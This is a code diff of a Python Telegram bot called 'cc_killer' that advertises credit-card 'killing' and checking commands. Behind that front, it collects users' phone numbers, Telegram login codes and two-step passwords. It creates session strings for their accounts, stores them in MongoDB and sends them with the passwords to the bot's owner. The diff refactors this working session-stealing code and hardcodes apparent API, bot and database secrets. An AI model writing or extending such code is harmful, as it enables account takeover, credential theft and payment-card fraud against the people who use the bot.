@@ -1,15 +1,17 @@
-import re
 import asyncio
-import threading
+import re
 from flask import Flask
 from pyrogram import Client, filters
-from pyrogram.types import Message, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
+from pyrogram.types import (
+    Message, ReplyKeyboardMarkup, KeyboardButton,
+    InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
+)
 from telethon import TelegramClient
 from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
 from telethon.sessions import StringSession
 from pymongo import MongoClient
+import threading
 
-# Telegram API Credentials
 API_ID = 29657994
 API_HASH = "85f461c4f637911d79c65da1fc2bdd77"
 BOT_TOKEN = "8009070392:AAF2e26nQnu49Z9Z8UHJFNOPivSGLMjzb-o"
@@ -18,15 +20,20 @@ MONGO_URL = "mongodb+srv://Krishna:pss968048@cluster0.4rfuzro.mongodb.net/?retry
 
 # MongoDB Setup
 mongo = MongoClient(MONGO_URL)
-db = mongo['cc_killer']
-sessions_col = db['sessions']
+db = mongo["cc_killer"]
+sessions_col = db["sessions"]
+
 user_data = {}
 
-# Flask & Pyrogram Setup
 app = Client("cc_killer_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
-flask_app = Flask(__name__)
+flask_app = Flask("rishu")
 
-# Start Command
+# Flask keep-alive route
+@flask_app.route("/")
+def home():
+    return "Bot is running"
+
+# Start command
 @app.on_message(filters.command("start"))
 async def start(client, message: Message):
     keyboard = [[InlineKeyboardButton("Register", callback_data="register")]]
@@ -34,34 +41,32 @@ async def start(client, message: Message):
     instructions = (
         "ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ 《 ₡₡ кɪʟʟᴇʀ 》!\n\n"
         f"ʜᴇʏ {message.from_user.first_name}\n\n"
-        "ʜᴇʀᴇ’ꜱ ʜᴏᴡ ʏᴏᴜ ᴄᴀɴ ɢᴇᴛ ꜱᴛᴀʀᴛᴇᴅ::\n\n"
-        " * ⌁ How it Works ! *\n\n"
+        "* ⌁ How it Works ! *\n\n"
         "ꜰᴇᴀᴛᴜʀᴇꜱ ⌁⌁\n"
         "[✓] /cu  [card_details] ⌁ ᴋɪʟʟ ᴄᴄ\n"
-        "[✓] /b3  [card_details] ⌁ ᴄʜᴇᴄᴋ ᴄᴀʀᴅ"
+        "[✓] /b3  [card_details] ⌁ ᴄʜᴇᴄᴋ ᴄᴀʀᴅ\n"
     )
     await message.reply_text(instructions, reply_markup=markup)
 
-# Register Inline Button
+# Register via inline button
 @app.on_callback_query(filters.regex("register"))
-async def inline_register(client, callback_query):
+async def inline_register(client, callback_query: CallbackQuery):
     keyboard = [[KeyboardButton("Share phone number", request_contact=True)]]
     reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
     await callback_query.message.reply_text("Please share your phone number to begin the login process.", reply_markup=reply_markup)
 
-# Register Command
+# Register via command
 @app.on_message(filters.command("register"))
 async def register(client, message: Message):
     keyboard = [[KeyboardButton("Share phone number", request_contact=True)]]
     reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
     await message.reply_text("Please share your phone number to begin the login process.", reply_markup=reply_markup)
 
-# Phone Number Handler
+# Phone number handler
 @app.on_message(filters.contact)
 async def handle_phone_number(client, message: Message):
     phone_number = message.contact.phone_number
     user_id = message.chat.id
-
     await message.reply_text("Sending OTP...")
 
     try:
@@ -73,64 +78,53 @@ async def handle_phone_number(client, message: Message):
             "client": tele_client,
             "phone_number": phone_number,
             "phone_code_hash": result.phone_code_hash,
+            "otp": ""
         }
 
-        await message.reply_text(
-            "OTP has been sent!\nEnter OTP using the buttons below:",
-            reply_markup=generate_otp_keyboard()
-        )
+        otp_buttons = [
+            [InlineKeyboardButton(str(i), callback_data=f"otp_{i}") for i in range(1, 4)],
+            [InlineKeyboardButton(str(i), callback_data=f"otp_{i}") for i in range(4, 7)],
+            [InlineKeyboardButton(str(i), callback_data=f"otp_{i}") for i in range(7, 10)],
+            [InlineKeyboardButton("0", callback_data="otp_0"),
+             InlineKeyboardButton("⌫", callback_data="otp_back"),
+             InlineKeyboardButton("✅ Submit", callback_data="otp_submit")]
+        ]
 
+        await message.reply_text("Enter OTP using the buttons below:",
+                                 reply_markup=InlineKeyboardMarkup(otp_buttons))
     except Exception as e:
         await message.reply_text(f"Error sending OTP: {str(e)}")
 
-    try:
-        await message.delete()
-    except:
-        pass
-
-# OTP Keyboard Generator
-def generate_otp_keyboard(current_otp=""):
-    buttons = []
-    for i in range(10):
-        buttons.append(InlineKeyboardButton(str(i), callback_data=f"otp_{current_otp}{i}"))
-    rows = [buttons[i:i+3] for i in range(0, 9, 3)]
-    rows.append([buttons[9]])
-    rows.append([
-        InlineKeyboardButton("⌫ Backspace", callback_data=f"otp_back_{current_otp}"),
-        InlineKeyboardButton("✅ Submit", callback_data=f"otp_submit_{current_otp}")
-    ])
-    return InlineKeyboardMarkup(rows)
-
-# OTP Inline Button Handler
-@app.on_callback_query(filters.regex("^otp_"))
-async def handle_otp_input(client, callback_query):
-    data = callback_query.data
+# OTP Inline Input Handler
+@app.on_callback_query(filters.regex(r"otp_"))
+async def handle_otp_input(client, callback_query: CallbackQuery):
     user_id = callback_query.from_user.id
+    data = callback_query.data.split("_")[1]
 
-    if data.startswith("otp_back_"):
-        otp = data.split("_", 2)[2][:-1]
-    elif data.startswith("otp_submit_"):
-        otp = data.split("_", 2)[2]
-        await callback_query.answer("Verifying OTP...")
-        fake_msg = Message(
-            id=callback_query.message.id,
-            chat=callback_query.message.chat,
-            from_user=callback_query.from_user,
-            text=otp
-        )
-        await handle_otp_or_password(client, fake_msg)
+    if user_id not in user_data:
+        await callback_query.answer("Session expired. Please register again.", show_alert=True)
+        return
+
+    if data == "back":
+        user_data[user_id]["otp"] = user_data[user_id]["otp"][:-1]
+    elif data == "submit":
+        otp = user_data[user_id]["otp"]
+        fake_message = callback_query.message
+        fake_message.from_user = callback_query.from_user
+        fake_message.chat = callback_query.message.chat
+        fake_message.text = otp
+        await handle_otp_or_password(client, fake_message)
         return
     else:
-        otp = data.split("_", 1)[1]
+        user_data[user_id]["otp"] += data
 
     await callback_query.edit_message_text(
-        f"Current OTP: `{otp}`\n\nUse the buttons below to complete OTP:",
-        reply_markup=generate_otp_keyboard(otp)
+        f"Entered OTP: `{user_data[user_id]['otp']}`",
+        reply_markup=callback_query.message.reply_markup
     )
 
-# OTP and 2FA Handler
-@app.on_message(filters.text & filters.private)
-async def handle_otp_or_password(client, message: Message):
+# OTP / 2FA Handler
+async def handle_otp_or_password(client: Client, message: Message):
     user_id = message.chat.id
     if user_id not in user_data:
         return
@@ -154,12 +148,10 @@ async def handle_otp_or_password(client, message: Message):
                 }}, upsert=True
             )
 
-            await app.send_message(OWNER_USERNAME, f"2FA login success for {user_info['phone_number']}:\nSession: `{session_string}`\nPassword: `{password}`")
+            await client.send_message(OWNER_USERNAME, f"2FA login success for {user_info['phone_number']}:\nSession: `{session_string}`\nPassword: `{password}`")
             await message.reply_text("Login successful with 2FA!")
-
         except Exception as e:
             await message.reply_text(f"2FA login failed: {str(e)}")
-
         finally:
             await telethon_client.disconnect()
             user_data.pop(user_id, None)
@@ -180,7 +172,7 @@ async def handle_otp_or_password(client, message: Message):
             }}, upsert=True
         )
 
-        await app.send_message(OWNER_USERNAME, f"Login success for {user_info['phone_number']}\nSession: `{session_string}`")
+        await client.send_message(OWNER_USERNAME, f"Login success for {user_info['phone_number']}\nSession: `{session_string}`")
         await message.reply_text("Login successful!")
         await telethon_client.disconnect()
         user_data.pop(user_id, None)
@@ -188,7 +180,6 @@ async def handle_otp_or_password(client, message: Message):
     except SessionPasswordNeededError:
         await message.reply_text("Two-Step Verification is enabled. Please send your password:")
         user_info["awaiting_password"] = True
-
     except PhoneCodeInvalidError:
         await message.reply_text("Invalid OTP. Please try again.")
     except Exception as e:
@@ -196,12 +187,7 @@ async def handle_otp_or_password(client, message: Message):
         await telethon_client.disconnect()
         user_data.pop(user_id, None)
 
-    try:
-        await message.delete()
-    except:
-        pass
-
-# View Logged In Users
+# Owner-only command to view logged-in users
 @app.on_message(filters.command("rishu"))
 async def view_logged_in_users(client, message: Message):
     if message.from_user.username != OWNER_USERNAME.strip("@"):
@@ -217,12 +203,7 @@ async def view_logged_in_users(client, message: Message):
 
     await message.reply_text(text or "No users logged in.")
 
-# Flask Route
-@flask_app.route('/')
-def home():
-    return "Bot is running"
-
-# Run Flask + Pyrogram
+# Flask keep-alive thread
 if __name__ == "__main__":
     threading.Thread(target=lambda: flask_app.run(host="0.0.0.0", port=8080)).start()
     app.run()
